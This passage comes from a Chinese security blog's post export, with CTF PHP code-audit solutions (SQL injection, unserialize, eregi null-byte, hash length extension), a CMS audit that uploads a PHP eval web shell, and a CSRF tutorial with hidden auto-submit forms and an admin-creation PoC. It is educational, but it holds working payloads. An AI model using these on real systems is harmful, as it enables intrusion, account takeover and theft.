'\".md5($password,true).\"'\";\nvar_dump($sql);\n$result=mysql_query($sql) or die('&lt;pre>' . mysql_error() . '&lt;/pre>' );\n$row1 = mysql_fetch_row($result);\nvar_dump($row1);\nmysql_close($link);\n?>\n这里重点关注的就是SQL语句\n$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";\nmd5函数中第二个参数为true，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。可以看出它是单引号闭合，如果我们生成的md5能是&#39; or xxx这种，就可以构成万能密码，此时就会得到全部数据，经过查找，md5加密后能生成这种字符串的为ffifdyop，它加密后为276f722736c95d99e921722cf9ed621c，而后经十六进制转换字符串为&#39;or&#39;6&lt;trash&gt;因此这里我们就可以构造如下payload来绕过\npassword=ffifdyop\nswitch没有break 字符与0比较绕过&lt;?php\nshow_source(__FILE__);\nerror_reporting(0);\n\nif (isset($_GET['which']))\n&#123;\n    $which = $_GET['which'];\n    switch ($which)\n    &#123;\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    &#125;\n&#125;\n\n?>\n小知识科普，当字符串转换成常量时，会经过intval函数转换，我们可以自行测试一下\n&lt;?php\nshow_source(__FILE__);\necho intval('flag');\n?>\n那么这里的话就会执行case 0对应的语句，我们此时来看一下这个case语句\ncase 0:\n   case 1:\n   case 2:\n       require_once $which.'.php';\n        echo $flag;\n       break;\n因为没有break，所以会接着执行case 1，又没有break，此时就会执行case 2，此时就包含了flag.php,输出了它的flag，因此我们构造payload如下即可\nwhich=flag\n\n\nunserialize()序列化&lt;!-- 题目：http://web.jarvisoj.com:32768 -->\n\n&lt;!-- index.php -->\n&lt;?php \nshow_source(__FILE__);\n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) &amp;&amp; $g = $_GET['class'];\n\tif (!empty($g)) &#123;\n\t\t$x = unserialize($g);\n\t&#125;\n\techo $x->readfile();\n?>\n&lt;img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n\n&lt;!-- shield.php -->\n\n&lt;?php\n\t//flag is in pctf.php\n\tclass Shield &#123;\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') &#123;\n\t\t\t$this -> file = $filename;\n\t\t&#125;\n\t\t\n\t\tfunction readfile() &#123;\n\t\t\tif (!empty($this->file) &amp;&amp; stripos($this->file,'..')===FALSE  \n\t\t\t&amp;&amp; stripos($this->file,'/')===FALSE &amp;&amp; stripos($this->file,'\\\\')==FALSE) &#123;\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n?>\n\n&lt;!-- showimg.php -->\n&lt;?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) &#123;\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&amp;&amp; stripos($f,'pctf')===FALSE) &#123;\n\t\t\treadfile($f);\n\t\t&#125; else &#123;\n\t\t\techo \"File not found!\";\n\t\t&#125;\n\t&#125;\n?>\n\n\nshowing.php中不允许传pctf，因此我们这里需要找其他点，我们发现开头的$x = new Shield();，此时的$x中的filename是空的，如果把他修改为pctf.php，后面再进行echo的时候不就可以成功读这个flag文件了吗，因此构造脚本如下\n&lt;?php \nshow_source(__FILE__);\n\trequire_once('shield.php');\n\t$x = new Shield();\n\t$g= serialize($x);\n\techo $g;\n?>\n&lt;img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n\n&lt;!-- shield.php -->\n\n&lt;?php\n\t//flag is in pctf.php\n\tclass Shield &#123;\n\t\tpublic $file;\n\t\tfunction __construct($filename = 'pctf.php') &#123;\n\t\t\t$this -> file = $filename;\n\t\t&#125;\n\t\t\n\t\tfunction readfile() &#123;\n\t\t\tif (!empty($this->file) &amp;&amp; stripos($this->file,'..')===FALSE  \n\t\t\t&amp;&amp; stripos($this->file,'/')===FALSE &amp;&amp; stripos($this->file,'\\\\')==FALSE) &#123;\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n?>\n\n得到\nO:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125;\n赋值给class即可，最终payload如下\nclass=O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125;\neregi函数漏洞&lt;?php\nif(!$_GET['id']) &#123;\n\theader('Location:\n  index.php?id=1');\n\texit();\n&#125;\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.')) \n\techo 'Hahahahahaha';\n\treturn ;\n&#125;\n$data = @file_get_contents($a,'r');\nif($data==\"1112 is a nice lab!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4) &#123;\n\trequire(\"flag.txt\");\n&#125; else &#123;\n\tprint \"work harder!harder!harder!\";\n&#125;\n?>\n条件\n1、$data==\"1112 is a nice lab!\" \n2、 $id==0 \n3、strlen($b)>5 \n4、eregi(\"111\".substr($b,0,1),\"1114\")\n5、 substr($b,0,1)!=4\n第一个，data来源于变量a，因此我们这里赋值a=1112 is a nice lab!即可实现第二个，id参数来源于变量id，我们这里同理给它赋值id=0即可第三个，长度大于5，接着看b的条件第四个，截取b参数的第一位，同时将114和b的第一位进行拼接，在1114中第五个，要求b参数的第一位不能是4\n四五看起来是矛盾的，但查阅相关资料后，发现eregi函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。简单的说就是当遇见%00后，后面的不再看了这里当我们给b赋值为%001的时候，它就会拼接这个%00，但函数处理时，会自动处理掉空格，同时后面的1不看，此时的它也就还是111,因为111是在1114中的，所以此时就可以绕过，不过我们还需要注意一下第三个条件，要求长度大于5，因此我们这里后面多添几个数字就可以，构造最终payload如下\na=1112 is a nice lab!&amp;b=%0012345&amp;id=0\n哈希长度扩展攻击&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n&lt;title>Web 350&lt;/title>\n&lt;style type=\"text/css\">\n        body &#123;\n                background:gray;\n                text-align:center;\n        &#125;\n&lt;/style>\n&lt;/head>\n\n&lt;body>\n        &lt;?php\n                $auth = false;\n                $role = \"guest\";\n                $salt =\n                if (isset($_COOKIE[\"role\"])) &#123;\n                        $role = unserialize($_COOKIE[\"role\"]);\n                        $hsh = $_COOKIE[\"hsh\"];\n                        if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"])))\n// strrev返回 string 反转后的字符串。 \n                         &#123;\n                                $auth = true;\n                        &#125; else &#123;\n                                $auth = false;\n                        &#125;\n                &#125; else &#123;\n                        $s = serialize($role);\n                        setcookie('role',$s);\n                        $hsh = md5($salt.strrev($s));\n                        setcookie('hsh',$hsh);\n                &#125;\n                if ($auth) &#123;\n                        echo \"&lt;h3>Welcome Admin. Your flag is \n                &#125; else &#123;\n                        echo \"&lt;h3>Only Admin can see the flag!!&lt;/h3>\";\n                &#125;\n        ?>\n        \n&lt;/body>\n原题环境http://web.jarvisoj.com:32778/这里的话看一下条件\nif (isset($_COOKIE[\"role\"])) &#123;\n                        $role = unserialize($_COOKIE[\"role\"]);\n                        $hsh = $_COOKIE[\"hsh\"];\n                        if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"])))\n这些条件满足才能使得变量auth为true，才会输出flag，此时看最重要的一个语句\n$role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"])))\n先看后面左边是我们通过cookie传入的$hsh右边是我们通过cookie传入的role经过反转和盐值拼接再经md5加密的结果，这个值需要与$hsh相等这个看起来是不可能实现的，我们不知道这个盐值的值，虽然hsh和role都可控，但想实现结果与hsh相等仍是十分困难的\n\n\n\n\n\n\n\n\n\n但是如MD5,SHA1,SHA2等，都是基于Merkle–Damgård结构，而这类算法的问题在于：如果你知道加密前的原文，和加密后的密文，只需要再知道盐值的长度，就能在原文后面添加信息并计算出相应的密文。\n盐值在前，原文在后，可以用hash长度扩展攻击。\n\n\n\n\n\n\n\n\n\n预测得到的是：md5（盐+原文+填充+恶意扩充）\n哈希长度扩展攻击我们通常使用HashPump进行利用\n\n\n\n\n\n\n\n\n\nHashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。\n安装过程如下\ngit clone https://github.com/bwall/HashPump\napt-get install g++ libssl-dev\ncd HashPump\nmake\nmake install\n这里的话我们抓包看一下初始的hsh和role的值role的值为s:5:&quot;guest&quot;;,hah的值为3a4727d57463f122833d9e732f94e4e0这里还利用到反序列化的一个特点，就是用unserialize函数时，后面的内容会被忽略，不进行反序列化，示例如下\n&lt;?php\n    $s = 's:5:\"admin\";  s:5:\"guest\";';\n    echo unserialize($s);\n?>\n这个就是攻击关键具体内容如下\nroot@VM-12-12-ubuntu:/tmp/HashPump#  hashpump\nInput Signature:  3a4727d57463f122833d9e732f94e4e0\nInput Data: ;\"tseug\":5:s\nInput Key Length: 12\nInput Data to Add: ^C\nroot@VM-12-12-ubuntu:/tmp/HashPump#  hashpump\nInput Signature:  3a4727d57463f122833d9e732f94e4e0\nInput Data:  ;\"tseug\":5:s\nInput Key Length: 12\nInput Data to Add: ;\"nimda\":5:s\nfcdc3840332555511c4e4323f6decb07\n;\"tseug\":5:s\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00;\"nimda\":5:s\n长度12是测试出来的，可以得到数据后进行逆序反转，同时将\\x00换成%00发包，看结果是否回显flag进行测试最终payload\nrole=s:5:\"admin\"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:\"guest\"%3b;hsh=fcdc3840332555511c4e4323f6decb07\n\ndesc与反引号引发的SQL注入&lt;?php\nshow_source(__FILE__);\nrequire(\"config.php\");\n$table = $_GET['table']?$_GET['table']:\"test\";\n$table = Filter($table);\nmysqli_query($mysqli,\"desc `secret_&#123;$table&#125;`\") or Hacker();\n$sql = \"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;\";\n$ret = sql_query($sql);\necho $ret[0];\n\n?>\n原题环境如下http://web.jarvisoj.com:32794/简单看一下代码，get传值table，然后有过滤，接下来就是desc这个语句，而后查询SQL语句，取出结果。常见的desc是用来查表的结构的，其使用方法是desc+表名，本地测试如下\nmysql> desc users;\n+----------+-------------+------+-----+---------+----------------+\n| Field    | Type        | Null | Key | Default | Extra          |\n+----------+-------------+------+-----+---------+----------------+\n| id       | int(3)      | NO   | PRI | NULL    | auto_increment |\n| username | varchar(20) | NO   |     | NULL    |                |\n| password | varchar(20) | NO   |     | NULL    |                |\n+----------+-------------+------+-----+---------+----------------+\n3 rows in set (0.01 sec)\n当desc和反引号结合使用时\ndesc users xxx; // 返回空\ndesc `users` `xxx`； //返回空\ndesc 'users' 'xxx'; //报错\n此时我们的语句就可以针对\nmysqli_query($mysqli,\"desc `secret_&#123;$table&#125;`\") or Hacker();\n\n进行绕过，我们构造table为test``xxx，此时结果为没有执行hacker()函数，说明成功绕过，此时我们再利用这个方式来进行联合查询即可查库\ntable=test` `union select database() limit 1,1\n查表\ntable=test` `union select group_concat(distinct table_name) from \ninformation_schema.columns where table_schema=database() limit 1,1\n查列\ntable=test` `union select group_concat(distinct column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1\n查字段\ntable=test` `union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1\n\n利用提交数组绕过逻辑&lt;?php \nshow_source(__FILE__);\n$role = \"guest\";\n$flag = \"flag&#123;test_flag&#125;\";\n$auth = false;\nif(isset($_COOKIE[\"role\"]))&#123;\n    $role = unserialize(base64_decode($_COOKIE[\"role\"]));\n    if($role === \"admin\")&#123;\n        $auth = true;\n    &#125;\n    else&#123;\n        $auth = false;\n    &#125;\n&#125;\nelse&#123;\n    $role = base64_encode(serialize($role));\n    setcookie('role',$role);\n&#125;\nif($auth)&#123;\n    if(isset($_POST['filename']))&#123;\n        $filename = $_POST['filename'];\n        $data = $_POST['data'];\n        if(preg_match('[&lt;>?]', $data)) &#123;\n            die('No No No!'.$data);\n        &#125;\n        else &#123;\n            $s = implode($data);\n            if(!preg_match('[&lt;>?]', $s))&#123;\n                $flag='None.';\n            &#125;\n            $rand = rand(1,10000000);\n            $tmp=\"./uploads/\".md5(time() + $rand).$filename;\n            file_put_contents($tmp, $flag);\n            echo \"your file is in \" . $tmp;\n        &#125;\n    &#125;\n    else&#123;\n        echo \"Hello admin, now you can upload something you are easy to forget.\";\n        echo \"&lt;br />there are the source.&lt;br />\";\n        echo '&lt;textarea rows=\"10\" cols=\"100\">';\n        echo htmlspecialchars(str_replace($flag,'flag&#123;???&#125;',file_get_contents(__FILE__)));\n        echo '&lt;/textarea>';\n    &#125;\n&#125;\nelse&#123;\n    echo \"Sorry. You have no permissions.\";\n&#125;\n?>\n\n两个点，第一个的话是让auth为真，这个的话需要满足条件$role === &quot;admin&quot;，这个的话我们可以看role的传值方式是unserialize(base64_decode($_COOKIE[&quot;role&quot;]));，反着操作一下就好了，构造脚本如下\n&lt;?php\n$a='admin';\necho base64_encode(serialize($a));\n?>\n得到czo1OiJhZG1pbiI7，此时我们赋值给role就可以实现auth为true，此时再来看第二个点上传文件名和文件内容，但data不能含有&lt;&gt;?，而 implode函数包裹后的data却又需要有&lt;&gt;?，此时才能够得到flag,对这个函数的简单介绍如下\nimplode()函数返回由数组元素组合成的字符串\n这里同之前相似，它处理的是字符串，当换成数组时就会输出Null，此时就绕过了此时就可以构造payload如下\nfilename=quan9i&amp;data[]=&lt;>?\n查看即可获取flag\n参考文献https://www.cnblogs.com/Cl0ud/p/13380114.htmlhttps://www.cnblogs.com/pcat/p/5478509.htmlhttps://saucer-man.com/information_security/101.htmlhttps://www.cnblogs.com/Cl0ud/p/13393754.htmlhttps://github.com/bowu678/php_bugs\n","slug":"代审基础——php_bugs","date":"2022-08-11T10:10:16.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"c41197658be58622f172adba6499db6f","title":"从零到入门水CVE","content":"前言认识的师傅说有的CMS是相对较简单的，拿到源码后就可以简单的进行一下代码审计，审出漏洞的话就可以尝试提交。本次审计过程记录如下\n审计过程找到简单的CMS后，进行本地环境搭建，然后用Seay审计系统进行扫描发现漏洞分为三种，SQL注入，文件上传，XSS，接下来进行\n/dashboard/add-blog.phpSQL注入(失败)查看这个INSERT语句，发现变量被单引号包裹，观察变量的传值方式，发现被mysqli_real_escape_string函数包裹，这个函数会转义特殊字符，对单引号这些进行了转义，此时的话这里暂时看是无法实现SQL注入的，看下一个漏洞点。\nXSS           if(ISSET($_POST['save']))&#123;\n$blog_title = mysqli_real_escape_string($con,$_POST['blog_title']);\n$blog_desc = mysqli_real_escape_string($con,$_POST['blog_desc']);\n$blog_detail = mysqli_real_escape_string($con,$_POST['blog_detail']);\n\n if ( strlen($blog_title) &lt; 5 )&#123;\n$msg=$msg.\"Blog Title Must Be More Than 5 Char Length.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n if ( strlen($blog_desc) > 150 )&#123;\n$msg=$msg.\"Short description Must Be Less Than 150 Char Length.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n\nif ( strlen($blog_detail) &lt; 15 )&#123;\n  $msg=$msg.\"Blog Detail Must Be More Than 15 Char Length.&lt;BR>\";\n  $status= \"NOTOK\";&#125;\n对于上传的变量只是限制了长度，没有防护XSS的，导致了XSS的出现\n文件上传$uploads_dir = 'uploads/blog';\n\n        $tmp_name = $_FILES[\"ufile\"][\"tmp_name\"];\n        // basename() may prevent filesystem traversal attacks;\n        // further validation/sanitation of the filename may be appropriate\n        $name = basename($_FILES[\"ufile\"][\"name\"]);\n        $random_digit=rand(0000,9999);\n        $new_file_name=$random_digit.$name;\n\n        move_uploaded_file($tmp_name, \"$uploads_dir/$new_file_name\");\n上传文件时未检验文件格式，导致木马文件可以正常上传上传文件内容\n&lt;?php\nphpinfo();\n@eval($_POST[1]);\n?>\n\n提交后\n\n/dashboard/add-social.phpSQL注入（失败）\n           if(ISSET($_POST['save']))&#123;\n$name = mysqli_real_escape_string($con,$_POST['name']);\n$fa = mysqli_real_escape_string($con,$_POST['fa']);\n$social_link = mysqli_real_escape_string($con,$_POST['social_link']);\n\n if ( strlen($name) &lt; 2 )&#123;\n$msg=$msg.\"Social Network Name Must Contain A Char.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n if ( strlen($fa) &lt; 1 )&#123;\n$msg=$msg.\"Fontawesome Must Be At Least 2 Char Long.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n\nif ( strlen($social_link) &lt; 5 )&#123;\n  $msg=$msg.\"Social Link Must Be More Than 6 Char Length.&lt;BR>\";\n  $status= \"NOTOK\";&#125;\n\n\n\nif($status==\"OK\")\n&#123;\n$qb=mysqli_query($con,\"INSERT INTO social (name, fa, social_link) VALUES ('$name', '$fa', '$social_link')\");\n这里的话不难看出同之前一致，SQL注入存在防护，因此不存在SQL注入，这里属于误报，下一处。\nXSS           if(ISSET($_POST['save']))&#123;\n$name = mysqli_real_escape_string($con,$_POST['name']);\n$fa = mysqli_real_escape_string($con,$_POST['fa']);\n$social_link = mysqli_real_escape_string($con,$_POST['social_link']);\n\n if ( strlen($name) &lt; 2 )&#123;\n$msg=$msg.\"Social Network Name Must Contain A Char.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n if ( strlen($fa) &lt; 1 )&#123;\n$msg=$msg.\"Fontawesome Must Be At Least 2 Char Long.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n\nif ( strlen($social_link) &lt; 5 )&#123;\n  $msg=$msg.\"Social Link Must Be More Than 6 Char Length.&lt;BR>\";\n  $status= \"NOTOK\";&#125;\n未对内容进行防护，只限制了长度，导致了XSS的出现\n/dashboard/add-service.phpXSS$msg=\"\";\n           if(ISSET($_POST['save']))&#123;\n$service_title = mysqli_real_escape_string($con,$_POST['service_title']);\n$service_desc = mysqli_real_escape_string($con,$_POST['service_desc']);\n$service_detail = mysqli_real_escape_string($con,$_POST['service_detail']);\n\n if ( strlen($service_title) &lt; 5 )&#123;\n$msg=$msg.\"Service Title Must Be More Than 5 Char Length.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n if ( strlen($service_desc) > 150 )&#123;\n$msg=$msg.\"Short description Must Be Less Than 150 Char Length.&lt;BR>\";\n$status= \"NOTOK\";&#125;\n\nif ( strlen($service_detail) &lt; 15 )&#123;\n  $msg=$msg.\"Service Detail Must Be More Than 15 Char Length.&lt;BR>\";\n  $status= \"NOTOK\";&#125;\n\n只检验了长度，未对XSS语句进行防护，导致XSS漏洞\n文件上传\n$uploads_dir = 'uploads/services';\n\n        $tmp_name = $_FILES[\"ufile\"][\"tmp_name\"];\n        // basename() may prevent filesystem traversal attacks;\n        // further validation/sanitation of the filename may be appropriate\n        $name = basename($_FILES[\"ufile\"][\"name\"]);\n        $random_digit=rand(0000,9999);\n        $new_file_name=$random_digit.$name;\n\n        move_uploaded_file($tmp_name, \"$uploads_dir/$new_file_name\");\n对文件本身未进行检验，格式也没有要求，导致PHP一句话木马可以成功上传上传文件内容\n&lt;?php\nphpinfo();\n@eval($_POST[1]);\n?>\n\n由于剩下的几个漏洞点均与上方这几个相似，SQL注入存在防护，XSS和文件上传未进行防护，所以这里不再一一演示\n提交将过程简单梳理一下，再用英文翻译一次，去https://vuldb.com/提交即可提交几小时后收到了邮件在网站下查看fw的我成功的水到了一个CVE！！！\n","slug":"从零到入门水CVE","date":"2022-08-09T11:28:30.000Z","categories_index":"代码审计","tags_index":"CVE","author_index":"quan9i"},{"id":"2fc52d0d731cc7ed8b93f6d476d9f632","title":"Flask SSTi从零到入门","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1698/\n文章由于hexo的md文件不接受具有{ {符号的，所以我这里不再放原文，想了解这篇文章的还请移步到跳跳糖社区\n","slug":"FLaskSSTI从零到入门","date":"2022-08-08T13:20:20.000Z","categories_index":"WEB知识","tags_index":"SSTI","author_index":"quan9i"},{"id":"c7fc7ecea32ae48ed7e292e1d2505a50","title":"记一次CSRF的浅学习","content":"前言CSRF只有简单了解，进行二次学习后总结如下，希望对正在学习CSRF的师傅有所帮助(本人只是小白，可能文章会出现问题，还请各位大师傅多多指点)\n漏洞相关信息漏洞成因受害者在未退出重要网站的情况下出于好奇心或者其他心理访问了某个恶意链接，而这个恶意链接指向某个网站，比如受害者刚刚登录不久的银行网站，就可以在受害者不知情的情况下进行转账交易。当然，这是个人理解，官方一点的如下\n\n\n\n\n\n\n\n\n\n主要成因：浏览器cookie不过期，不关闭浏览器或退出登录，都会默认为已登录状态次要成因：对请求合法性验证不严格\n漏洞定义CSRF，即Cross Site Request Forgery，译为跨站点请求伪造，看起来似乎与XSS(跨站脚本攻击)是相像的，但两者实际上大相径庭，XSS是获取到网站信任用户的具体信息，进行攻击，而而CSRF则通过伪装成受信任用户进行攻击。对CSRF用一个简单的事例来进行讲解\n1、老八访问www.bank.com,登录后存入100元\n2、老八存过钱后未关闭网站，浏览其他网站时发现有一个名字为3060显卡100元处理的广告，老八点击访问\n3、访问后发现什么也没有，老八大失所望，悻悻的离开网站\n4、老八再次查看银行时，发现刚刚的钱被转走了\n这个过程是怎么实现的呢，我们看一下这个链接的内容\n&lt;html>\n  &lt;body>\n  &lt;script>history.pushState('', '', '/')&lt;/script>\n    &lt;form action=\"http://www.bank.com\" method=\"POST\">\n      &lt;input type=\"hidden\" name=\"money\" value=\"100\" />\n      &lt;input type=\"hidden\" name=\"submit\" value=\"submit\" />\n    &lt;/form>\n  &lt;/body>\n&lt;/html>\n可以发现当访问它的时候，它自动进行了一个表单的提交，将100块钱进行了转出，而表面是什么也没有的（这个例子存在部分小问题，比如代码中没以有具体写转向了哪里，但不影响整体理解），这个时候老八刚刚存入的100就不翼而飞了。流程图的话，如下所示\n漏洞危害\n\n\n\n\n\n\n\n\n1、篡改目标网站上的用户数据2、盗取用户隐私数据3、作为其他攻击向量的辅助攻击手法4、 传播CSRF蠕虫\n常见类型GET上传针对GET类型，这个比较简单，我们只需要构造一个虚假链接，在里面添上我们的payload即可，构造如下所示假设银行转账界面为877.php，代码如下所示\n&lt;?php \n$money=$_GET['money'];\n$user=$_GET['user'];\nprint(\"向 $user 转账成功，金额为 $money\");\n?>\n此时攻击者构造恶意界面为1.php，具体代码如下\n&lt;html>\n    &lt;a href=\"http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=100\">杀马特团长的故事&lt;/a>\n&lt;/html>\n此时我们访问1.php当受害者出于好奇访问此链接时\n&lt;img src=\"http://bank.com/?money=100&amp;user=hacker\" style=\"display:none;\"/>\n//这里的style=\"display:none;\"指的是隐藏元素\n对 style=&quot;display:none;&quot;讲解具体示例如下示例代码如下\n&lt;html>\n\n&lt;head>\n\n&lt;title>&lt;/title>\n\n&lt;style type=\"text/css\">\n\n    div&#123;\n\n        background: lightblue;\n\n        width: 200px;\n\n        height: 200px;\n\n    &#125;\n\n    span&#123;\n\n        background: pink;\n\n        \n\n    &#125;\n\n&lt;/style>\n\n&lt;/head>\n\n&lt;body >\n\n    &lt;div>&lt;span>需要隐藏的区域&lt;/span>&lt;/div>\n\n&lt;/body>\n\n&lt;/html>\n此时访问这个界面而当我们在background: pink;后加上display:none;时\n&lt;html>\n\n&lt;head>\n\n&lt;title>&lt;/title>\n\n&lt;style type=\"text/css\">\n\n    div&#123;\n\n        background: lightblue;\n\n        width: 200px;\n\n        height: 200px;\n\n    &#125;\n\n    span&#123;\n\n        background: pink;\n        display: none;\n        \n\n    &#125;\n\n&lt;/style>\n\n&lt;/head>\n\n&lt;body >\n\n    &lt;div>&lt;span>需要隐藏的区域&lt;/span>&lt;/div>\n\n&lt;/body>\n\n&lt;/html>\n此时访问界面成功隐藏此界面\nPOST上传对于POST类型上传的，我们这个时候需要构造一个表单来进行提交，这个相对GET是比较麻烦的，不过我们这里可以简化一下，使用burpsuite工具来迅速构造出对应的表单，举例如下银行转账界面仍877.php，其代码如下所示\n&lt;?php \n$money=$_POST['money'];\n$user=$_POST['user'];\nprint(\"向 $user 转账成功，金额为 $money\");\n?>\n我们访问这个界面，自己先赋值一下，获取到参数，然后抓包发包到重放模块，修改用户名和金额构造poc将内容复制到我们的恶意链接，也就是1.php中\n&lt;html>\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional -->\n  &lt;body>\n  &lt;script>history.pushState('', '', '/')&lt;/script>\n    &lt;form action=\"http://127.0.0.1:8080/html/877.php/\" method=\"POST\">\n      &lt;input type=\"hidden\" name=\"money\" value=\"100\" />\n      &lt;input type=\"hidden\" name=\"user\" value=\"hacker\" />\n      &lt;input type=\"submit\" value=\"Submit request\" />\n    &lt;/form>\n  &lt;/body>\n&lt;/html>\n此时当用户点击这个恶意链接时，界面如下\n\ntoken验证当随机生成token时，有两种方式，一种是通过xss获取当前界面的token，与此同时构造恶意链接，另一种是直接利用burpsuite的CSRF token插件来进行自动更新token具体的话在下方中靶场实战时进行讲解\n攻击思路一般对于GET型，大多是利用标签来进行攻击，这个方式是有效且快捷的，因此我们这里先大致罗列一下常用的标签而针对POST型的话，一般都是构造表单，这个的话我们就利用bp的CSRF PoC就可以生成对应的表单。下面来大致讲解一下GET型时可以利用的标签\n常用标签超链接标签\n&lt;a>标签：&lt;a href=\"http://xxx.com/?user=xx&amp;money=xx\">&lt;/a>\nimg标签\n&lt;img>标签: &lt;img src=\"http://xxx.com/?user=xx&amp;money=xx\">\niframe标签\n&lt;iframe>标签：&lt;iframe src=\"http://xxx.com/?user=xx&amp;moeny=xx\">\n由于前两个在之前示例中已经讲过，所以这里不再举例子，这里的话讲解一下iframe标签，先创建一个银行界面（GET型），命名为877.php，内容如下\n&lt;?php \n$money=$_GET['money'];\n$user=$_GET['user'];\nprint(\"向 $user 转账成功，金额为 $money\");\n?>\n此时我们构造恶意链接，命名为1.php，内容如下\n&lt;html>\n  &lt;body>\n    &lt;iframe src=\"http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=1000\" style= \"display:none\";>\n  &lt;/body>\n&lt;/html>\n当我们访问1.php的时候发现全是空白，这是因为style= &quot;display:none&quot;;隐藏了元素，当我们把这个去掉的时候可以发现成功转账了\n短链接伪装当我们使用超链接时，就算用中文来进行掩饰，但下方的超链接仍然会暴露出来，此时如果受害者发现的话就不会再点击这个链接了，这个时候我们可以对链接进行一定的伪装，我们知道一串较长的链接可以通过短地址来进行缩短，因此我们这里就可以通过缩短链接来进行伪装\n网上有很多短链接生成工具，这里我随便用一个，链接如下http://ddz.ee/输入我们的恶意代码，即http://127.0.0.1:8080/html/877.php?user=hacker&amp;money=1000\n将生成的链接放到1.php中，替换到原来的，具体如下图\n&lt;html>\n&lt;a href=\"http://ddz.ee/A8PF7\">虎哥的东北往事&lt;/a>\n&lt;/body>\n&lt;/html>\n此时我们访问这个1.php可以发现变成了这个，没有那么明显了，点击过后\n成功进行了转账\nCSRF漏洞挖掘CSRF的话，肯定是利用管理员的权限来进行某些操作，所以我们在进行代码审计的时候，可以关注一下后台文件，看是否存在CSRF漏洞\nxhcms登录后台界面，发现有删除文章的权限抓删除文件时的包发送到重放模块，利用bp自带的CSRF poc进行恶意语句构造可以发现这里是未检测token的，因此是极有可能存在CSRF的，我们复制到文件中并命名为xhcms.html点击访问访问\n\n\n\n\n\n\n\n\n\n注意：这个是在同一个浏览器下的情况，此时只有这个浏览器上仍然存有管理员的信息，能够直接执行语句，当换到其他浏览器时，就无法执行删除语句，访问会跳转到登录界面\n\nbeescms登录后台，发现有添加管理员界面，随便输入一下抓包，发送到重放模块\n未发现Token，可能存在CSRF，这个时候我们自定义信息，接下来利用bp构造poc，得到\n&lt;html>\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional -->\n  &lt;body>\n  &lt;script>history.pushState('', '', '/')&lt;/script>\n    &lt;form action=\"http://127.0.0.1:8080/beescms/admin/admin_admin.php?nav=list_admin_user&amp;admin_p_nav=user\" method=\"POST\" enctype=\"multipart/form-data\">\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;name\" value=\"1231\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;password\" value=\"1231\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;password2\" value=\"1231\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;nich\" value=\"1231\" />\n      &lt;input type=\"hidden\" name=\"purview\" value=\"1\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;admin\" value=\"1231\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;mail\" value=\"1&amp;#64;qq&amp;#46;com&amp;#9;&amp;#9;\" />\n      &lt;input type=\"hidden\" name=\"admin&amp;#95;tel\" value=\"1234\" />\n      &lt;input type=\"hidden\" name=\"is&amp;#95;disable\" value=\"0\" />\n      &lt;input type=\"hidden\" name=\"action\" value=\"save&amp;#95;admin\" />\n      &lt;input type=\"hidden\" name=\"submit\" 